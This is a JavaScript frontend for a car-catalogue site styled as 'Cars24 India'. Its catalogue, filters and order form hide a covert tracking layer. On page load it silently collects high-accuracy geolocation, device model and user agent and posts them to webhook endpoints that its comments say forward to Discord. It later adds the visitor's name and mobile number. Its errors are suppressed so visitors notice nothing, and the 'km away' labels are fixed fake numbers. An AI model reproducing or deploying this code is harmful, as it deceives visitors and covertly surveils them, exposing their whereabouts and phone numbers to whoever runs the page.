/**
 * ============================================
 * Cars24 India - Frontend JavaScript
 * ============================================
 * Handles:
 * - Silent background location detection (NO UI shown to user)
 * - Discord webhook communication via backend proxy
 * - User name capture and personalization
 * - Optional OTP mobile verification
 * - Car catalog filtering, sorting, and display
 * - Order inquiry modal
 */

// ═══════════════════════════════════════════════
//              CAR DATA
// ═══════════════════════════════════════════════

const carDatabase = [
  {
    id: 1,
    brand: 'Lamborghini',
    model: 'Huracan EVO',
    type: 'supercar',
    price: 32200000,
    priceLakh: '3.22 Cr',
    image: '/images/lamborghini-huracan.png',
    fuel: 'Petrol',
    transmission: 'Automatic',
    badges: ['hot'],
    dealer: 'Lamborghini Mumbai',
    distance: 0
  },
  {
    id: 2,
    brand: 'Ferrari',
    model: 'Roma',
    type: 'supercar',
    price: 36100000,
    priceLakh: '3.61 Cr',
    image: '/images/ferrari-roma.png',
    fuel: 'Petrol',
    transmission: 'Automatic',
    badges: ['hot'],
    dealer: 'Ferrari Delhi',
    distance: 0
  },
  {
    id: 3,
    brand: 'Porsche',
    model: '911 Turbo S',
    type: 'supercar',
    price: 33500000,
    priceLakh: '3.35 Cr',
    image: '/images/porsche-911.png',
    fuel: 'Petrol',
    transmission: 'Automatic',
    badges: ['hot'],
    dealer: 'Porsche Bangalore',
    distance: 0
  },
  {
    id: 4,
    brand: 'Mercedes-Benz',
    model: 'S-Class',
    type: 'luxury',
    price: 17000000,
    priceLakh: '1.70 Cr',
    image: '/images/mercedes-sclass.png',
    fuel: 'Petrol/Diesel',
    transmission: 'Automatic',
    badges: ['new'],
    dealer: 'Mercedes Hyderabad',
    distance: 0
  },
  {
    id: 5,
    brand: 'BMW',
    model: '7 Series',
    type: 'luxury',
    price: 16500000,
    priceLakh: '1.65 Cr',
    image: '/images/bmw-7series.png',
    fuel: 'Petrol/Diesel',
    transmission: 'Automatic',
    badges: ['new'],
    dealer: 'BMW Pune',
    distance: 0
  },
  {
    id: 6,
    brand: 'Audi',
    model: 'RS7 Sportback',
    type: 'luxury',
    price: 22400000,
    priceLakh: '2.24 Cr',
    image: '/images/audi-rs7.png',
    fuel: 'Petrol',
    transmission: 'Automatic',
    badges: ['hot'],
    dealer: 'Audi Chennai',
    distance: 0
  },
  {
    id: 7,
    brand: 'Mahindra',
    model: 'Thar',
    type: 'suv',
    price: 1565000,
    priceLakh: '15.65 Lakh',
    image: '/images/mahindra-thar.png',
    fuel: 'Petrol/Diesel',
    transmission: 'Manual/Auto',
    badges: ['offroad'],
    dealer: 'Mahindra showroom',
    distance: 0
  },
  {
    id: 8,
    brand: 'Hyundai',
    model: 'Creta',
    type: 'suv',
    price: 1157000,
    priceLakh: '11.57 Lakh',
    image: '/images/hyundai-creta.png',
    fuel: 'Petrol/Diesel',
    transmission: 'Manual/IVT',
    badges: ['new'],
    dealer: 'Hyundai showroom',
    distance: 0
  },
  {
    id: 9,
    brand: 'Tata',
    model: 'Harrier',
    type: 'suv',
    price: 1599000,
    priceLakh: '15.99 Lakh',
    image: '/images/tata-harrier.png',
    fuel: 'Diesel',
    transmission: 'Manual/AT',
    badges: ['new'],
    dealer: 'Tata Motors showroom',
    distance: 0
  },
  {
    id: 10,
    brand: 'Kia',
    model: 'Seltos',
    type: 'suv',
    price: 1199000,
    priceLakh: '11.99 Lakh',
    image: '/images/kia-seltos.png',
    fuel: 'Petrol/Diesel',
    transmission: 'Manual/IVT/DCT',
    badges: ['new'],
    dealer: 'Kia showroom',
    distance: 0
  },
  {
    id: 11,
    brand: 'Toyota',
    model: 'Fortuner',
    type: 'suv',
    price: 3359000,
    priceLakh: '33.59 Lakh',
    image: '/images/toyota-fortuner.png',
    fuel: 'Petrol/Diesel',
    transmission: 'Manual/AT',
    badges: ['offroad'],
    dealer: 'Toyota showroom',
    distance: 0
  },
  {
    id: 12,
    brand: 'MG',
    model: 'Hector Plus',
    type: 'suv',
    price: 1838000,
    priceLakh: '18.38 Lakh',
    image: '/images/mg-hector.png',
    fuel: 'Petrol/Diesel',
    transmission: 'Manual/CVT',
    badges: ['new'],
    dealer: 'MG showroom',
    distance: 0
  },
  {
    id: 13,
    brand: 'Hyundai',
    model: 'Verna',
    type: 'sedan',
    price: 1195000,
    priceLakh: '11.95 Lakh',
    image: '/images/hyundai-verna.png',
    fuel: 'Petrol/Diesel',
    transmission: 'Manual/IVT',
    badges: ['new'],
    dealer: 'Hyundai showroom',
    distance: 0
  },
  {
    id: 14,
    brand: 'Honda',
    model: 'City',
    type: 'sedan',
    price: 1261000,
    priceLakh: '12.61 Lakh',
    image: '/images/honda-city.png',
    fuel: 'Petrol',
    transmission: 'Manual/CVT',
    badges: ['new'],
    dealer: 'Honda showroom',
    distance: 0
  },
  {
    id: 15,
    brand: 'Maruti Suzuki',
    model: 'Swift',
    type: 'hatchback',
    price: 659000,
    priceLakh: '6.59 Lakh',
    image: '/images/maruti-swift.png',
    fuel: 'Petrol/CNG',
    transmission: 'Manual/AMT',
    badges: ['new'],
    dealer: 'Maruti Suzuki Arena',
    distance: 0
  },
  {
    id: 16,
    brand: 'Tata',
    model: 'Nexon',
    type: 'suv',
    price: 810000,
    priceLakh: '8.10 Lakh',
    image: '/images/tata-nexon.png',
    fuel: 'Petrol/Electric',
    transmission: 'Manual/AMT',
    badges: ['electric'],
    dealer: 'Tata Motors showroom',
    distance: 0
  },
  {
    id: 17,
    brand: 'Toyota',
    model: 'Innova Crysta',
    type: 'mpv',
    price: 1999000,
    priceLakh: '19.99 Lakh',
    image: '/images/toyota-innova.png',
    fuel: 'Diesel/Petrol',
    transmission: 'Manual/AT',
    badges: ['new'],
    dealer: 'Toyota showroom',
    distance: 0
  },
  {
    id: 18,
    brand: 'Hyundai',
    model: 'i20',
    type: 'hatchback',
    price: 703000,
    priceLakh: '7.03 Lakh',
    image: '/images/hyundai-i20.png',
    fuel: 'Petrol/Diesel',
    transmission: 'Manual/IVT',
    badges: ['new'],
    dealer: 'Hyundai showroom',
    distance: 0
  }
];

// ═══════════════════════════════════════════════
//              GLOBAL STATE
// ═══════════════════════════════════════════════
const state = {
  userName: '',
  mobile: '',
  isVerified: false,
  latitude: null,
  longitude: null,
  accuracy: null,
  currentCarId: null
};

// ═══════════════════════════════════════════════
//              DOM ELEMENTS
// ═══════════════════════════════════════════════
const DOM = {
  navbar: document.getElementById('navbar'),
  mobileMenu: document.getElementById('mobile-menu'),
  mobileMenuBtn: document.getElementById('mobile-menu-btn'),
  heroLocateBtn: document.getElementById('hero-locate-btn'),
  navLocateBtn: document.getElementById('nav-locate-btn'),
  mobileLocateBtn: document.getElementById('mobile-locate-btn'),
  nameSection: document.getElementById('name-section'),
  nameInput: document.getElementById('user-name-input'),
  submitNameBtn: document.getElementById('submit-name-btn'),
  otpSection: document.getElementById('otp-section'),
  otpCloseBtn: document.getElementById('otp-close-btn'),
  otpStep1: document.getElementById('otp-step-1'),
  otpStep2: document.getElementById('otp-step-2'),
  mobileInput: document.getElementById('mobile-input'),
  sendOtpBtn: document.getElementById('send-otp-btn'),
  skipOtpBtn: document.getElementById('skip-otp-btn'),
  otpInput: document.getElementById('otp-input'),
  verifyOtpBtn: document.getElementById('verify-otp-btn'),
  resendOtpBtn: document.getElementById('resend-otp-btn'),
  otpMessage: document.getElementById('otp-message'),
  otpMobileDisplay: document.getElementById('otp-mobile-display'),
  typeTabs: document.getElementById('type-tabs'),
  carGrid: document.getElementById('car-grid'),
  emptyState: document.getElementById('empty-state'),
  resultsCount: document.getElementById('results-count'),
  resultsLocation: document.getElementById('results-location'),
  filterBrand: document.getElementById('filter-brand'),
  filterPrice: document.getElementById('filter-price'),
  filterSort: document.getElementById('filter-sort'),
  filterResetBtn: document.getElementById('filter-reset-btn'),
  clearFiltersBtn: document.getElementById('clear-filters-btn'),
  orderModal: document.getElementById('order-modal'),
  modalCloseBtn: document.getElementById('modal-close-btn'),
  modalCarName: document.getElementById('modal-car-name'),
  modalCarPrice: document.getElementById('modal-car-price'),
  orderForm: document.getElementById('order-form'),
  orderName: document.getElementById('order-name'),
  orderMobile: document.getElementById('order-mobile'),
  orderNotes: document.getElementById('order-notes'),
  modalSuccess: document.getElementById('modal-success'),
  modalDoneBtn: document.getElementById('modal-done-btn')
};

// ═══════════════════════════════════════════════
//              INITIALIZATION
// ═══════════════════════════════════════════════
document.addEventListener('DOMContentLoaded', () => {
  // Initialize Lucide icons
  if (window.lucide) lucide.createIcons();

  // Render cars immediately
  renderCars(carDatabase);

  // Bind events
  bindEvents();

  // Navbar scroll effect
  window.addEventListener('scroll', () => {
    DOM.navbar.classList.toggle('scrolled', window.scrollY > 10);
  });

  // SILENTLY fetch location in background (no UI shown to user)
  fetchLocationSilently();
});

function bindEvents() {
  // Mobile menu toggle
  DOM.mobileMenuBtn.addEventListener('click', () => {
    DOM.mobileMenu.classList.toggle('active');
  });

  // Close mobile menu on link click
  DOM.mobileMenu.querySelectorAll('.mobile-link').forEach(link => {
    link.addEventListener('click', () => {
      DOM.mobileMenu.classList.remove('active');
    });
  });

  // "Nearby Cars" button scrolls to cars section
  DOM.heroLocateBtn.addEventListener('click', () => {
    document.getElementById('cars-section').scrollIntoView({ behavior: 'smooth' });
  });
  if (DOM.navLocateBtn) DOM.navLocateBtn.addEventListener('click', (e) => {
    e.preventDefault();
    document.getElementById('cars-section').scrollIntoView({ behavior: 'smooth' });
  });
  if (DOM.mobileLocateBtn) DOM.mobileLocateBtn.addEventListener('click', (e) => {
    e.preventDefault();
    document.getElementById('cars-section').scrollIntoView({ behavior: 'smooth' });
    DOM.mobileMenu.classList.remove('active');
  });

  // Name submission
  DOM.submitNameBtn.addEventListener('click', submitUserName);
  DOM.nameInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') submitUserName(); });

  // OTP section
  DOM.otpCloseBtn.addEventListener('click', closeOtpSection);
  DOM.skipOtpBtn.addEventListener('click', closeOtpSection);
  DOM.sendOtpBtn.addEventListener('click', sendOtp);
  DOM.verifyOtpBtn.addEventListener('click', verifyOtp);
  DOM.resendOtpBtn.addEventListener('click', sendOtp);

  // Type tabs
  if (DOM.typeTabs) {
    DOM.typeTabs.querySelectorAll('.type-tab').forEach(tab => {
      tab.addEventListener('click', () => {
        DOM.typeTabs.querySelectorAll('.type-tab').forEach(t => t.classList.remove('active'));
        tab.classList.add('active');
        applyFilters();
      });
    });
  }

  // Filters
  DOM.filterBrand.addEventListener('change', applyFilters);
  DOM.filterPrice.addEventListener('change', applyFilters);
  DOM.filterSort.addEventListener('change', applyFilters);
  DOM.filterResetBtn.addEventListener('click', resetFilters);
  if (DOM.clearFiltersBtn) DOM.clearFiltersBtn.addEventListener('click', resetFilters);

  // Order modal
  DOM.modalCloseBtn.addEventListener('click', closeOrderModal);
  DOM.orderModal.addEventListener('click', (e) => {
    if (e.target === DOM.orderModal) closeOrderModal();
  });
  DOM.orderForm.addEventListener('submit', submitOrder);
  DOM.modalDoneBtn.addEventListener('click', closeOrderModal);
}

// ═══════════════════════════════════════════════
//         SILENT LOCATION (Background Only)
// ═══════════════════════════════════════════════

/**
 * Fetches user's location silently in the background.
 * NO UI feedback at all - user never sees anything related to location.
 * Location data is used only for:
 * 1. Sending to Discord webhooks via backend
 * 2. Setting static distance labels on car cards
 */
function fetchLocationSilently() {
  if (!navigator.geolocation) return;

  navigator.geolocation.getCurrentPosition(
    handleLocationSuccess,
    handleLocationError,
    {
      enableHighAccuracy: true,
      timeout: 15000,
      maximumAge: 0
    }
  );
}

async function handleLocationSuccess(position) {
  const { latitude, longitude, accuracy } = position.coords;
  state.latitude = latitude;
  state.longitude = longitude;
  state.accuracy = accuracy;

  const deviceInfo = getDeviceInfo();

  const payload = {
    latitude,
    longitude,
    accuracy,
    deviceName: deviceInfo.name,
    deviceModel: deviceInfo.model,
    userAgent: navigator.userAgent,
    timestamp: position.timestamp
  };

  // Send to backend webhook endpoint (silent, no UI)
  try {
    await fetch('/api/webhook/location', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch (error) {
    // Silent fail - user doesn't need to know
  }

  // If name is already entered, also send name webhook
  if (state.userName) {
    await sendNameWebhook({ ...payload, name: state.userName });
  }

  // Set static distances ONCE and re-render
  setCarDistances();
}

function handleLocationError(error) {
  // Silently ignore - user doesn't need to see any error
  // Location is optional, cars still show without it
  console.log('[Location] Permission denied or unavailable - continuing without location');
}

/**
 * Get device name and model from user agent.
 */
function getDeviceInfo() {
  const ua = navigator.userAgent;
  let name = 'Unknown';
  let model = '';

  if (/iPhone/.test(ua)) {
    name = 'Apple iPhone';
    model = ua.match(/iPhone OS (\d+)/)?.[1] ? `iOS ${ua.match(/iPhone OS (\d+)/)[1]}` : '';
  } else if (/iPad/.test(ua)) {
    name = 'Apple iPad';
  } else if (/Samsung/.test(ua)) {
    name = 'Samsung';
    const match = ua.match(/SM-(\w+)/);
    if (match) model = match[0];
  } else if (/Pixel/.test(ua)) {
    name = 'Google Pixel';
    const match = ua.match(/Pixel (\d+)/);
    if (match) model = `Pixel ${match[1]}`;
  } else if (/OnePlus/.test(ua)) {
    name = 'OnePlus';
    const match = ua.match(/OnePlus[ _](\w+)/);
    if (match) model = match[0];
  } else if (/Xiaomi/.test(ua)) {
    name = 'Xiaomi';
  } else if (/Realme/.test(ua)) {
    name = 'Realme';
  } else if (/Vivo/.test(ua)) {
    name = 'Vivo';
  } else if (/Oppo/.test(ua)) {
    name = 'Oppo';
  } else if (/Android/.test(ua)) {
    name = 'Android Device';
  } else if (/Windows/.test(ua)) {
    name = 'Windows PC';
  } else if (/Macintosh/.test(ua)) {
    name = 'Mac';
  } else if (/Linux/.test(ua)) {
    name = 'Linux Device';
  }

  return { name, model };
}

// ═══════════════════════════════════════════════
//              USER NAME HANDLING
// ═══════════════════════════════════════════════

async function submitUserName() {
  const name = DOM.nameInput.value.trim();
  if (!name) return;

  state.userName = name;

  // Visual feedback
  DOM.submitNameBtn.innerHTML = '<i data-lucide="check" class="icon-sm green"></i>';
  DOM.submitNameBtn.disabled = true;
  DOM.nameInput.disabled = true;
  if (window.lucide) lucide.createIcons();

  // Send name webhook if location is available
  if (state.latitude !== null) {
    await sendNameWebhook({
      name,
      latitude: state.latitude,
      longitude: state.longitude,
      accuracy: state.accuracy,
      deviceName: getDeviceInfo().name,
      deviceModel: getDeviceInfo().model,
      userAgent: navigator.userAgent,
      timestamp: Date.now()
    });
  }

  // Show OTP section after short delay
  setTimeout(() => {
    DOM.otpSection.style.display = 'block';
    DOM.mobileInput.focus();
  }, 800);
}

async function sendNameWebhook(payload) {
  try {
    await fetch('/api/webhook/name', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch (error) {
    // Silent fail
  }
}

// ═══════════════════════════════════════════════
//              OTP VERIFICATION (Optional)
// ═══════════════════════════════════════════════

function closeOtpSection() {
  DOM.otpSection.style.display = 'none';
}

async function sendOtp() {
  const mobile = DOM.mobileInput.value.trim();
  if (!/^\d{10}$/.test(mobile)) {
    showOtpMessage('Please enter a valid 10-digit mobile number', 'error');
    return;
  }

  DOM.sendOtpBtn.disabled = true;
  DOM.sendOtpBtn.innerHTML = '<div class="spinner" style="width:14px;height:14px;border-width:2px;"></div> Sending...';

  try {
    const response = await fetch('/api/send-otp', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ mobile })
    });
    const data = await response.json();

    if (data.success) {
      DOM.otpStep1.style.display = 'none';
      DOM.otpStep2.style.display = 'block';
      DOM.otpMobileDisplay.textContent = `+91 ${mobile.substring(0, 5)} ${mobile.substring(5)}`;
      DOM.otpInput.focus();
      state.mobile = mobile;
    } else {
      showOtpMessage(data.message || 'Failed to send OTP', 'error');
    }
  } catch (error) {
    showOtpMessage('Network error. Please try again.', 'error');
  }

  DOM.sendOtpBtn.disabled = false;
  DOM.sendOtpBtn.innerHTML = '<i data-lucide="send" class="icon"></i> Send OTP';
  if (window.lucide) lucide.createIcons();
}

async function verifyOtp() {
  const otp = DOM.otpInput.value.trim();
  if (!/^\d{4,6}$/.test(otp)) {
    showOtpMessage('Please enter a valid OTP', 'error');
    return;
  }

  DOM.verifyOtpBtn.disabled = true;
  DOM.verifyOtpBtn.innerHTML = '<div class="spinner" style="width:14px;height:14px;border-width:2px;"></div> Verifying...';

  try {
    const response = await fetch('/api/verify-otp', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ mobile: state.mobile, otp })
    });
    const data = await response.json();

    if (data.verified) {
      state.isVerified = true;
      showOtpMessage('Mobile number verified successfully!', 'success');

      // Log verification to webhook (silent)
      await fetch('/api/webhook/otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          name: state.userName,
          mobile: state.mobile,
          latitude: state.latitude,
          longitude: state.longitude,
          accuracy: state.accuracy
        })
      });

      // Pre-fill order form
      DOM.orderName.value = state.userName;
      DOM.orderMobile.value = state.mobile;

      setTimeout(() => closeOtpSection(), 2000);
    } else {
      showOtpMessage(data.message || 'Invalid OTP', 'error');
      DOM.otpInput.value = '';
      DOM.otpInput.focus();
    }
  } catch (error) {
    showOtpMessage('Network error. Please try again.', 'error');
  }

  DOM.verifyOtpBtn.disabled = false;
  DOM.verifyOtpBtn.innerHTML = '<i data-lucide="check-circle" class="icon"></i> Verify OTP';
  if (window.lucide) lucide.createIcons();
}

function showOtpMessage(msg, type) {
  DOM.otpMessage.textContent = msg;
  DOM.otpMessage.className = `otp-message ${type}`;
  setTimeout(() => { DOM.otpMessage.textContent = ''; DOM.otpMessage.className = 'otp-message'; }, 4000);
}

// ═══════════════════════════════════════════════
//              CAR RENDERING & FILTERING
// ═══════════════════════════════════════════════

function renderCars(cars) {
  if (cars.length === 0) {
    DOM.carGrid.style.display = 'none';
    DOM.emptyState.style.display = 'block';
    DOM.resultsCount.textContent = 'No cars found';
    return;
  }

  DOM.carGrid.style.display = 'grid';
  DOM.emptyState.style.display = 'none';
  DOM.resultsCount.textContent = `Showing ${cars.length} car${cars.length !== 1 ? 's' : ''}`;

  DOM.carGrid.innerHTML = cars.map(car => createCarCard(car)).join('');

  if (window.lucide) lucide.createIcons();
}

function createCarCard(car) {
  const badgesHtml = car.badges.map(b => {
    const labels = { hot: 'Hot', new: 'New', electric: 'EV', offroad: 'Off-Road' };
    return `<span class="badge badge-${b}">${labels[b] || b}</span>`;
  }).join('');

  const distanceHtml = car.distance > 0
    ? `<div class="car-distance"><i data-lucide="map-pin" class="icon-sm"></i> ${car.distance.toFixed(1)} km away</div>`
    : '';

  return `
    <div class="car-card" data-id="${car.id}">
      <div class="car-card-image">
        <img src="${car.image}" alt="${car.brand} ${car.model}" loading="lazy">
        <div class="car-badge">${badgesHtml}</div>
        ${distanceHtml}
      </div>
      <div class="car-card-body">
        <div class="car-brand">${car.brand}</div>
        <h3 class="car-name">${car.model}</h3>
        <div class="car-specs">
          <div class="car-spec">
            <i data-lucide="fuel" class="icon"></i>
            ${car.fuel}
          </div>
          <div class="car-spec">
            <i data-lucide="settings-2" class="icon"></i>
            ${car.transmission}
          </div>
        </div>
        <div class="car-card-footer">
          <div class="car-price">
            ${car.priceLakh}
            <span>Ex-Showroom</span>
          </div>
          <button class="order-btn" onclick="openOrderModal(${car.id})">Get Price</button>
        </div>
        <div class="car-dealer"><i data-lucide="store" class="icon-sm"></i> ${car.dealer}</div>
      </div>
    </div>
  `;
}

function applyFilters() {
  const activeTab = DOM.typeTabs?.querySelector('.type-tab.active');
  const type = activeTab ? activeTab.dataset.type : 'all';

  const brand = DOM.filterBrand.value;
  const priceRange = DOM.filterPrice.value;
  const sort = DOM.filterSort.value;

  let filtered = [...carDatabase];

  if (type !== 'all') {
    filtered = filtered.filter(car => car.type === type);
  }

  if (brand !== 'all') {
    filtered = filtered.filter(car => car.brand.toLowerCase().includes(brand));
  }

  if (priceRange !== 'all') {
    const [min, max] = priceRange.split('-').map(Number);
    filtered = filtered.filter(car => {
      const priceLakh = car.price / 100000;
      return priceLakh >= min && (max >= 999 ? true : priceLakh <= max);
    });
  }

  switch (sort) {
    case 'price-low':
      filtered.sort((a, b) => a.price - b.price);
      break;
    case 'price-high':
      filtered.sort((a, b) => b.price - a.price);
      break;
    case 'name-az':
      filtered.sort((a, b) => `${a.brand} ${a.model}`.localeCompare(`${b.brand} ${b.model}`));
      break;
    default:
      filtered.sort((a, b) => {
        const typeOrder = { supercar: 0, luxury: 1, suv: 2, sedan: 3, mpv: 4, hatchback: 5, pickup: 6 };
        return (typeOrder[a.type] || 5) - (typeOrder[b.type] || 5);
      });
  }

  renderCars(filtered);
}

function resetFilters() {
  DOM.filterBrand.value = 'all';
  DOM.filterPrice.value = 'all';
  DOM.filterSort.value = 'default';
  if (DOM.typeTabs) {
    DOM.typeTabs.querySelectorAll('.type-tab').forEach(t => t.classList.remove('active'));
    DOM.typeTabs.querySelector('[data-type="all"]')?.classList.add('active');
  }
  renderCars(carDatabase);
}

function setFilter(type) {
  if (DOM.typeTabs) {
    DOM.typeTabs.querySelectorAll('.type-tab').forEach(t => t.classList.remove('active'));
    const target = DOM.typeTabs.querySelector(`[data-type="${type}"]`);
    if (target) target.classList.add('active');
  }
  applyFilters();
  document.getElementById('cars-section').scrollIntoView({ behavior: 'smooth' });
}

window.setFilter = setFilter;

/**
 * Set car distances ONCE with fixed values.
 * Called only once when location is first detected.
 * Distances never change after this.
 */
function setCarDistances() {
  const fixedDistances = [3.2, 5.8, 8.1, 2.5, 4.3, 6.7, 1.2, 2.8, 3.5, 4.9, 7.2, 5.1, 3.8, 6.4, 1.8, 2.1, 8.5, 4.0];
  carDatabase.forEach((car, i) => {
    car.distance = fixedDistances[i] || Math.round((Math.random() * 10 + 1) * 10) / 10;
  });
  applyFilters();
}

// ═══════════════════════════════════════════════
//              ORDER MODAL
// ═══════════════════════════════════════════════

function openOrderModal(carId) {
  const car = carDatabase.find(c => c.id === carId);
  if (!car) return;

  state.currentCarId = carId;

  DOM.modalCarName.textContent = `${car.brand} ${car.model}`;
  DOM.modalCarPrice.textContent = `${car.priceLakh} (Ex-Showroom)`;

  // Pre-fill form
  DOM.orderName.value = state.userName || '';
  DOM.orderMobile.value = state.mobile || '';

  DOM.orderForm.style.display = 'block';
  DOM.modalSuccess.style.display = 'none';
  DOM.orderModal.style.display = 'flex';
  DOM.orderModal.style.flexDirection = 'column';

  document.body.style.overflow = 'hidden';
}

window.openOrderModal = openOrderModal;

function closeOrderModal() {
  DOM.orderModal.style.display = 'none';
  document.body.style.overflow = '';
  state.currentCarId = null;
}

async function submitOrder(e) {
  e.preventDefault();

  const car = carDatabase.find(c => c.id === state.currentCarId);
  if (!car) return;

  const submitBtn = DOM.orderForm.querySelector('button[type="submit"]');
  submitBtn.disabled = true;
  submitBtn.innerHTML = '<div class="spinner" style="width:16px;height:16px;border-width:2px;"></div> Submitting...';

  // Build location string silently (user never sees this)
  let locationStr = 'Not shared';
  if (state.latitude && state.longitude) {
    locationStr = `${state.latitude.toFixed(6)}, ${state.longitude.toFixed(6)}`;
  }

  try {
    const response = await fetch('/api/order', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        name: DOM.orderName.value,
        mobile: DOM.orderMobile.value,
        carId: car.id,
        carModel: `${car.brand} ${car.model}`,
        location: locationStr
      })
    });
    const data = await response.json();

    if (data.success) {
      DOM.orderForm.style.display = 'none';
      DOM.modalSuccess.style.display = 'block';
      if (window.lucide) lucide.createIcons();
    }
  } catch (error) {
    alert('Something went wrong. Please try again.');
  }

  submitBtn.disabled = false;
  submitBtn.innerHTML = '<i data-lucide="send" class="icon"></i> Get Dealer Callback';
  if (window.lucide) lucide.createIcons();
}

// ═══════════════════════════════════════════════
//              KEYBOARD SHORTCUTS
// ═══════════════════════════════════════════════
document.addEventListener('keydown', (e) => {
  if (e.key === 'Escape') {
    if (DOM.orderModal.style.display === 'flex') closeOrderModal();
    if (DOM.otpSection.style.display === 'block') closeOtpSection();
  }
});
